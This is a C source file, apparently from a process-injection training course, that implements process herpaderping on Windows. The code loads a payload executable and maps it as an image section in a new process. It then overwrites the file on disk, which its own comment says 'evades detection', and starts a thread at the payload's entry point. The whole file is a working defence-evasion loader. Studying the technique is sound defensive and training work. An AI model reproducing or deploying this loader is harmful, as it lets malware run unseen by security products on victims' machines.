#include <windows.h>
#include "herp.h"
#include <stdio.h>

// helper function - GetPayloadBuffer
BYTE* GetPayloadBuffer(OUT size_t& p_size) {
    HANDLE hFile = CreateFileW(L"C:\\Users\\vagrant\\Desktop\\CPIA-Work\\ProcessInjection\\ProcessDoppleganging\\Payload64\\payload64.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        perror("[-] Unable to open the payload file...\n");
        exit(-1);
    }
    p_size = GetFileSize(hFile, 0);
    BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (bufferAddress == NULL) {
        perror("[-] Failed to allocate memory to the payload buffer...\n");
        exit(-1);
    }
    DWORD bytesRead = 0;
    if(!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
        perror("[-] Failed to read the payload buffer.... \n");
        exit(-1);
    }
    return bufferAddress;
}
// Getting entry point of the payload within the child process which was created from the image section.
ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payloadBuffer, PROCESS_BASIC_INFORMATION pbi) {
    // resolving requisite apis
    _RtlImageNtHeader pRtlImageNtHeader = (_RtlImageNtHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
    if (pRtlImageNtHeader == NULL) {
        perror("[-] Failed to resolve RtlImageNTHeader API...\n");
        exit(-1);
    }
    _NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
    if (pNtReadVirtualMemory == NULL) {
        perror("[-] Failed to resolve NtReadVirtualMemory API...\n");
        exit(-1);
    }

    BYTE image[0x1000];
    ULONG_PTR entryPoint;
    SIZE_T bytesRead;
    NTSTATUS status;
    ZeroMemory(image, sizeof(image));
    status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image, sizeof(image), &bytesRead);
    if (!NT_SUCCESS(status)){
        perror("[-] Failed to read the PEB base address\n");
        exit(-1);
    }
    printf("[+] PEB image base address : %p\n", (ULONG_PTR)((PPEB)image)->ImageBaseAddress);
    entryPoint = (pRtlImageNtHeader(payloadBuffer))->OptionalHeader.AddressOfEntryPoint;
    printf("[+] Address of the entry point: %p\n", entryPoint);
    entryPoint += (ULONG_PTR)((PPEB)image)->ImageBaseAddress;
    printf("[+] Entry point address adjusted with the image base address: %p\n", entryPoint);

    return entryPoint;
}

BOOL Herpaderping(BYTE* payloadBuffer, size_t payloadSize) {
    // resolvinf requisite apis
    	_NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
	if (pNtCreateSection == NULL) {
		perror("[-] Could not resolve NtCreateSection API...\n");
		exit(-1);
	}
	_NtCreateProcessEx pNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");
	if (pNtCreateProcessEx == NULL) {
		perror("[-] Could not resolve NtCreateProcessEx API...\n");
		exit(-1);
	}
	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL) {
		perror("[-] Could not resolve NtQueryInformationProcess API...\n");
		exit(-1);
	}
	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
	if (pNtCreateThreadEx == NULL) {
		perror("[-] Could not resolve NtCreateThreadEx API...\n");
		exit(-1);
	}
	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
	if (pRtlCreateProcessParametersEx == NULL) {
		perror("[-] Could not resolve RtlCreateProcessParametersEx API...\n");
		exit(-1);
	}
	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (pRtlInitUnicodeString == NULL) {
		perror("[-] Could not resolve RtlInitUnicodeString API...\n");
		exit(-1);
	}
	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	if (pNtWriteVirtualMemory == NULL) {
		perror("[-] Could not resolve NtWriteVirtualMemory API...\n");
		exit(-1);
	}
	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	if (pNtAllocateVirtualMemory == NULL) {
		perror("[-] Could not resolve NtAllocateVirtualMemory API...\n");
		exit(-1);
	}

    HANDLE hTemp; // handle to the temporary file on the disk
    HANDLE hSection;
    HANDLE hProcess;
    HANDLE hThread;
    NTSTATUS status;
    PROCESS_BASIC_INFORMATION pbi;
    PEB* remotePEB;
    DWORD bytesWritten;
    signed int bufferSize;
    ULONG_PTR entryPoint;
    UNICODE_STRING uTargetFilePath;
    UNICODE_STRING uDllPath;
    PRTL_USER_PROCESS_PARAMETERS processParameters;

    wchar_t tempPath[MAX_PATH] = { 0 };
    wchar_t tempFile[MAX_PATH] = { 0 };
    GetTempPathW(MAX_PATH, tempPath);
    GetTempFileNameW(tempPath, L"HD", 0, tempFile);
    wprintf(L"Creating temporary file: %s\n", tempFile);

    // create temporary file on the disk
    hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE,
        0, CREATE_ALWAYS, 0, 0);
    if (hTemp == INVALID_HANDLE_VALUE) {
        perror("[-] Error creating temporary file...\n");
        exit(-1);
    }
    printf("[+] Created temporary file on disk\n");

    // write payload to the temporary file
    if(!WriteFile(hTemp, payloadBuffer, payloadSize, &bytesWritten, NULL)){
        perror("[-] Unable to write payload to the temporary file...\n");
        exit(-1);
    }
    printf("[+] Wrote payload to the temporary file\n"); // in HxD, view or reload the file and we can see our malicious payload.

    // create section with the temporary file; SEC_IMAGE flag for PE vlidation
    status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0 , PAGE_READONLY, SEC_IMAGE, hTemp);
    if (!NT_SUCCESS(status)){
        perror("[-] Failed to create a section with the temporary file\n");
        exit(-1);
    }
    printf("[+] Created a section with the temporary file\n"); // for herp.exe in system informer, click 'handles' and you can see section pointing to the path of the temp file created above.

    // create process with the section
    status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
    if (!NT_SUCCESS(status)){
        perror("[-] Failed to create a process with the section\n");
        exit(-1);
    }
    printf("[+] Created a process with the section\n"); // in systen informer, you can see now herp.exe has a child process with the name of the temp file. Right click for properties.

    // Get process information of the process created above.
    status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), 0);
    if (!NT_SUCCESS(status)){
        perror("[-] Failed to query the process information\n");
        exit(-1);
    }
    printf("[+] queried process information, extracting entryPoint address\n");

    entryPoint = GetEntryPoint(hProcess, payloadBuffer, pbi);

    // modify file in disk before we create process and it's thread -- evades detection
    SetFilePointer(hTemp, 0, 0, FILE_BEGIN);
    bufferSize = GetFileSize(hTemp, 0);
    // bufferSize = 0x1000;
    wchar_t bytesToWrite[] = L"Hello Purple Chan!\n";
    while (bufferSize > 0) {
        WriteFile(hTemp, bytesToWrite, sizeof(bytesToWrite), &bytesWritten, NULL);
        bufferSize -= bytesWritten;
    }
    printf("[+] Modified file on the disk\n"); // reloading the tmp file on the disk in HxD can vaidate this.

    // Set process parameters of the child process. We need to set process parameters because we cannot create a thread within a process which has no parameters set.
    printf("[+] Setting process parameters\n");
    wchar_t targetFilePath[MAX_PATH] = { 0 };
    lstrcpyW(targetFilePath, L"C:\\Windows\\System32\\calc.exe"); // these values are fake, we can set these to any thing...
    pRtlInitUnicodeString(&uTargetFilePath, targetFilePath);
    wchar_t dllDir[] = L"C:\\Windows\\System32";
    UNICODE_STRING uDllDir = { 0 };
    pRtlInitUnicodeString(&uDllPath, dllDir);
    status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath, NULL, &uTargetFilePath, 
        NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED); // the processParameters can be validated by adding the var 'processParameters' to debug watch.
    if (!NT_SUCCESS(status)){
        perror("[-] Failed to set process parameters\n");
        exit(-1);
    }

    SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
    PVOID paramBuffer = processParameters;
    status = pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0 , &paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        perror("[-] Failed to allocate virtual memory to write process parameters\n");
        exit(-1);
    }

    status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters, 
        processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
    if (!NT_SUCCESS(status)) {
        perror("[-] Failed to write process parameters\n");
        exit(-1);
    }

    // Getting the remote/target PEB address
    remotePEB = (PEB*)pbi.PebBaseAddress; // this address can be found in the 'memory' section of the 'system informer' of the child / spawned process.
    if(!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL)) { // the remotePEB->ProcessParameters are at 0x20 offset of the PEB based address. Can be verified in system informer.
        perror("[-] Failed to update the process parameters address\n");
        exit(-1);
    }

    printf("[+] Process parameters are set\n");

    // Create and resume thread
    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        (LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, 0);
    wprintf(L"[+] Thread executed...\n");
    if (!NT_SUCCESS(status)) {
        perror("Unable to start thread.. \n");
        exit(-1);
    }
    CloseHandle(hTemp);
    return TRUE;
}


int main() {
    size_t payloadSize;
    BYTE* payloadBuffer = GetPayloadBuffer(payloadSize);
    BOOL isSuccess = Herpaderping(payloadBuffer, payloadSize);
    system("pause");
}